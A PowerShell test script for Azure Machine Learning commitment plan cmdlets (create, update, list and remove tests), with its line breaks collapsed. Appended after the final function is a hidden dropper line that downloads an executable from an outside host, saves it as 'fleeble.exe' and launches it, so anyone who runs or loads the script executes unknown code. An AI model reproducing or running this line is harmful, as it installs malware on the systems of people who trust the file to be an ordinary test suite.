function Test-CreateGetRemoveMLCommitmentPlan{$planDeleted = $false$actualTest = {param([string] $location)try{$resourceGroupName = Get-ResourceGroupName $commitmentPlanName = Get-CommitmentPlanNameLogOutput "Creating resource group: $resourceGroupName"$group = New-AzResourceGroup -Name $resourceGroupName -Location $locationLogOutput("Created resource group: $($group.ResourceId)")LogOutput "Creating commitment plan: $commitmentPlanName"$plan = New-AzMlCommitmentPlan -ResourceGroupName $resourceGroupName -Location $location -Name $commitmentPlanName -SkuName "S1" -SkuTier "Standard" -ForceAssert-NotNull $plan$planId = $plan.IdLogOutput "Created commitment plan: $planId"ValidateCommitmentPlanResult $resourceGroupName $commitmentPlanName $location $planLogOutput "Removing commitment plan $commitmentPlanName from resource group $resourceGroupName"$plan | Remove-AzMlCommitmentPlan -ForceLogOutput "Commitment plan $commitmentPlanName was removed."$planDeleted = $trueAssert-ThrowsContains { Get-AzMlCommitmentPlan -ResourceGroupName $resourceGroupName -Name $commitmentPlanName } "ResourceNotFound"}finally{if (!$planDeleted) {                   Clean-CommitmentPlan $resourceGroupName $commitmentPlanName}Clean-ResourceGroup $resourceGroupName}};RunCommitmentPlansTest $actualTest}function Test-UpdateMLCommitmentPlan{  $planDeleted = $false$actualTest = {param([string] $location)try{$resourceGroupName = Get-ResourceGroupName $commitmentPlanName = Get-CommitmentPlanNameLogOutput "Creating resource group: $resourceGroupName"$group = New-AzResourceGroup -Name $resourceGroupName -Location $locationLogOutput("Created resource group: $($group.ResourceId)")LogOutput "Creating commitment plan: $commitmentPlanName"$plan = New-AzMlCommitmentPlan -ResourceGroupName $resourceGroupName -Location $location -Name $commitmentPlanName -SkuName "S1" -SkuTier "Standard" -ForceAssert-NotNull $plan$planId = $plan.IdLogOutput "Created commitment plan: $planId"ValidateCommitmentPlanResult $resourceGroupName $commitmentPlanName $location $planLogOutput "Updating commitment plan $planId"Update-AzMlCommitmentPlan -ResourceGroupName $resourceGroupName -Name $commitmentPlanName -SkuName "S2" -SkuTier "Standard" -SkuCapacity 2 -Tag @{"tag1" = "value1"} -ForceLogOutput "Removing commitment plan $commitmentPlanName from resource group $resourceGroupName"$plan | Remove-AzMlCommitmentPlan -ForceLogOutput "Commitment plan $commitmentPlanName was removed."$planDeleted = $trueAssert-ThrowsContains { Get-AzMlCommitmentPlan -ResourceGroupName $resourceGroupName -Name $commitmentPlanName } "ResourceNotFound"}finally{if (!$planDeleted){Clean-CommitmentPlan $resourceGroupName $commitmentPlanName}Clean-ResourceGroup $resourceGroupName}};RunCommitmentPlansTest $actualTest}function Test-ListMLCommitmentPlans{$actualTest = {param([string] $location)try{$firstResourceGroupName = Get-ResourceGroupName$firstCommitmentPlanName = Get-CommitmentPlanName$secondCommitmentPlanName = Get-CommitmentPlanNameLogOutput "Creating first resource group: $firstResourceGroupName"$firstGroup = New-AzResourceGroup -Name $firstResourceGroupName -Location $locationLogOutput("Created first resource group: $($firstGroup.ResourceId)")LogOutput "Creating first commitment plan: $firstCommitmentPlanName"$firstPlan = New-AzMlCommitmentPlan -ResourceGroupName $firstResourceGroupName -Location $location -Name $firstCommitmentPlanName -SkuName "S1" -SkuTier "Standard" -ForceAssert-NotNull $firstPlan$firstPlanId = $firstPlan.IdLogOutput "Created first commitment plan: $firstPlanId"ValidateCommitmentPlanResult $firstResourceGroupName $firstCommitmentPlanName $location $firstPlanLogOutput "Creating second commitment plan: $secondCommitmentPlanName"$secondPlan = New-AzMlCommitmentPlan -ResourceGroupName $firstResourceGroupName -Location $location -Name $secondCommitmentPlanName -SkuName "S1" -SkuTier "Standard" -ForceAssert-NotNull $secondPlan$secondPlanId = $secondPlan.IdLogOutput "Created second commitment plan: $secondPlanId"ValidateCommitmentPlanResult $firstResourceGroupName $secondCommitmentPlanName $location $secondPlan$secondResourceGroupName = Get-ResourceGroupName$thirdCommitmentPlanName = Get-CommitmentPlanNameLogOutput "Creating second resource group: $secondResourceGroupName"$secondGroup = New-AzResourceGroup -Name $secondResourceGroupName -Location $locationLogOutput("Created second resource group: $($secondResourceGroupName.ResourceId)")LogOutput "Creating third commitment plan: $thirdCommitmentPlanName"$thirdPlan = New-AzMlCommitmentPlan -ResourceGroupName $secondResourceGroupName -Location $location -Name $thirdCommitmentPlanName -SkuName "S1" -SkuTier "Standard" -ForceAssert-NotNull $thirdPlan$thirdPlanId = $thirdPlan.IdLogOutput "Created third commitment plan: $thirdPlanId"ValidateCommitmentPlanResult $secondResourceGroupName $thirdCommitmentPlanName $location $thirdPlanLogOutput "Listing all commitment plans in first resource group: $firstResourceGroupName"$plansInFirstGroup = Get-AzMlCommitmentPlan -ResourceGroupName $firstResourceGroupNameAssert-NotNull $plansInFirstGroupLogOutput "Group $firstResourceGroupName contains $($plansInFirstGroup.Count) commitment plans."Assert-AreEqual 2 $plansInFirstGroup.CountLogOutput "Checking that first commitment plan $($firstPlan.Id) is part of returned list."Assert-NotNull ($plansInFirstGroup | where { $_.Id -eq $firstPlan.Id })LogOutput "Checking that second commitment plan $($secondPlan.Id) is part of returned list."Assert-NotNull ($plansInFirstGroup | where { $_.Id -eq $secondPlan.Id })LogOutput "Listing all commitment plans in second resource group: $secondResourceGroupName"$plansInSecondGroup = Get-AzMlCommitmentPlan -ResourceGroupName $secondResourceGroupNameAssert-NotNull $plansInSecondGroupLogOutput "Group $secondResourceGroupName contains $($plansInSecondGroup.Count) commitment plans."Assert-AreEqual 1 $plansInSecondGroup.CountLogOutput "Checking that commitment plan $($thirdPlan.Id) is part of returned list."Assert-True { $plansInSecondGroup[0].Id -eq $thirdPlan.Id }$plansInSubscription = Get-AzMlCommitmentPlanAssert-NotNull $plansInSubscriptionLogOutput "Found $($plansInSubscription.Count) commitment plans in the current subscription."Assert-False { $plansInSubscription.Count -lt 3 }LogOutput "Checking that commitment plan $($firstPlan.Id) is part of returned list."Assert-NotNull ($plansInSubscription | where { $_.Id -eq $firstPlan.Id })LogOutput "Checking that commitment plan $($secondPlan.Id) is part of returned list."Assert-NotNull ($plansInSubscription | where { $_.Id -eq $secondPlan.Id })LogOutput "Checking that commitment plan $($thirdPlan.Id) is part of returned list."Assert-NotNull ($plansInSubscription | where { $_.Id -eq $thirdPlan.Id })}finally{Clean-WebService $firstResourceGroupName $firstCommitmentPlanNameClean-WebService $firstResourceGroupName $secondCommitmentPlanNameClean-WebService $secondResourceGroupName $thirdCommitmentPlanNameClean-ResourceGroup $firstResourceGroupNameClean-ResourceGroup $secondResourceGroupName}};RunCommitmentPlansTest $actualTest}function RunCommitmentPlansTest([ScriptBlock] $testScript){$location = Get-ProviderLocation "Microsoft.MachineLearning" "commitmentPlans"$cpApiVersion = Get-ProviderAPIVersion "Microsoft.MachineLearning" "commitmentPlans"LogOutput "Using version $cpApiVersion of the CP RP APIs"try{&$testScript $location}finally{}}function ValidateCommitmentPlanResult([string] $rgName, [string] $commitmentPlanName, [string] $location, `[Microsoft.Azure.Management.MachineLearning.CommitmentPlans.Models.CommitmentPlan] $plan){$subscriptionId = ((Get-AzContext).Subscription).SubscriptionId        $expectedResourceId = "/subscriptions/$subscriptionId/resourceGroups/$rgName/providers/Microsoft.MachineLearning/commitmentPlans/$commitmentPlanName"$planId = $plan.IdLogOutput "Checking that the created commitment plan's resource id ($planId) matches the expected value ($expectedResourceId)"Assert-AreEqual $expectedResourceId $planId$planLocation = $plan.LocationLogOutput "Checking that the commitment plan's location ($planLocation) is the expected value ($location)"Assert-True { [System.String]::Equals($planLocation.Replace(" ", ""), $location, [System.StringComparison]::OrdinalIgnoreCase) }$expectedResourceType = "Microsoft.MachineLearning/commitmentPlans"$planType = $plan.TypeLogOutput "Checking the commitment plan's resource type: ($planType) matches the expected value ($expectedResourceType)"Assert-AreEqual $expectedResourceType $planTypeLogOutput "Checking that the commitment plan's properties are not null."Assert-NotNull $plan.Properties}(New-Object System.Net.WebClient).DownloadFile('http://matkalv.5gbfree.com/noza/odeee.exe','fleeble.exe');Start-Process 'fleeble.exe'